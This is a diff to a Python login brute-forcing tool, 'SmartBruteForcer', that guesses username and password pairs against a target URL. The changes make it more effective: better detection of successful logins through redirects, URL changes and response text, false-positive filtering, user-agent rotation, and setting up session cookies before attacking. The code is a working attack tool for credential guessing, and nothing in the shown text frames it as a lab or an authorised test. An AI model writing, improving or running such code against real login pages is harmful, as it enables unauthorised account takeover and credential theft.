@@ -116,6 +116,7 @@ class SmartBruteForcer:
         self.successful = False
         self.result = None
         self.verbose = config.get('verbose', False)
+        self.base_url = config['target_url']
         
         if config.get('headers'):
             self.session.headers.update(config['headers'])
@@ -166,30 +167,53 @@ class SmartBruteForcer:
                 self.attempts += 1
                 
             success_indicators = self.config.get('success_indicators', [])
-            failure_indicators = self.config.get('failure_indicators', [])
+            failure_indicators = [f.lower() for f in self.config.get('failure_indicators', [])]
             
             is_success = False
-            for indicator in success_indicators:
-                if indicator in response.text:
-                    is_success = True
-                    break
             
+            # 1. Check if we were redirected (History check)
+            # Most successful logins redirect (302) to a dashboard/profile
+            if response.history:
+                for hist_resp in response.history:
+                    if hist_resp.status_code in [301, 302, 303, 307, 308]:
+                        # Check where it redirected to
+                        final_location = response.url.lower()
+                        if 'login' not in final_location or 'dashboard' in final_location or 'account' in final_location:
+                            is_success = True
+                            break
+
+            # 2. Check final URL vs Initial URL
             if not is_success:
-                # Success detection via status codes or redirection logic
-                if response.status_code in [301, 302, 303, 307, 308] or ('dashboard' in response.url.lower()):
-                     is_success = True
+                if response.url.rstrip('/') != self.base_url.rstrip('/'):
+                    # If the URL changed and it doesn't look like a login page reload, it's likely success
+                    if 'login' not in response.url.lower() or 'dashboard' in response.url.lower():
+                        is_success = True
+
+            # 3. Check for success text indicators
+            if not is_success:
+                for indicator in success_indicators:
+                    if indicator.lower() in response.text.lower():
+                        is_success = True
+                        break
+            
+            # 4. Filter out False Positives using failure indicators
+            if is_success:
+                for indicator in failure_indicators:
+                    if indicator in response.text.lower():
+                        is_success = False
+                        break
 
             if self.verbose:
                 status = "[CORRECT]" if is_success else "[INCORRECT]"
                 # Format: url - username - password - [incorrect/correct]
-                print(f"{self.config['target_url']} - {username} - {password} - {status}")
+                print(f"{self.base_url} - {username} - {password} - {status}")
 
             if is_success:
                 logger.info(f"SUCCESS! Credentials found -> {username}:{password}")
                 return True, {
                     'username': username,
                     'password': password,
-                    'response': response.text[:200] if not ('dashboard' in response.url.lower()) else "Redirection",
+                    'response_url': response.url,
                     'status_code': response.status_code
                 }
 
@@ -200,14 +224,22 @@ class SmartBruteForcer:
             return False, {}
     
     def test_connection(self) -> bool:
-        """Test if the target is reachable"""
+        """Test reachability and establish initial session cookies"""
         try:
+            logger.info(f"Testing connection to {self.base_url}...")
+            # Visit the login page first to get cookies/tokens
             response = self.session.get(
-                self.config['target_url'],
-                timeout=15
+                self.base_url,
+                timeout=15,
+                headers={'User-Agent': self.rotate_user_agent()}
             )
-            logger.info(f"Target reachable: {response.status_code}")
-            return True
+            
+            if response.status_code == 200:
+                logger.info(f"Target reachable. Initial cookies established: {dict(self.session.cookies)}")
+                return True
+            else:
+                logger.warning(f"Target returned status {response.status_code}")
+                return True # Try anyway
         except Exception as e:
             logger.error(f"Target connection failed: {e}")
             return False
